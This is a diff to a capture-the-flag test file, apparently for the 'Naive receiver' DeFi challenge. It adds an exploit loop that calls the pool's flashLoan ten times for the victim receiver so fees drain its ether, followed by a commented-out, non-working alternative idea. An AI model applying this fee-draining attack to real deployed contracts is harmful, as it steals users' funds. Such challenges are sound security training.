@@ -31,6 +31,21 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
+        for(let i = 0; i < 10; i++) {
+            await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('0'));
+        }
+
+        // I think if I have call "receiveEther" with super expensive "FEE",
+        // It can be solved as one shot
+        // await this.receiver
+        //     .connect(this.pool.address)
+        //     .functionCallWithValue(
+        //         ethers.utils.abi.encodeWithSignature(
+        //             "receiveEther(uint256)",
+        //             ethers.utils.parseEther('8')
+        //         ),
+        //         ethers.utils.parseEther('1')
+        //     );
     });
 
     after(async function () {
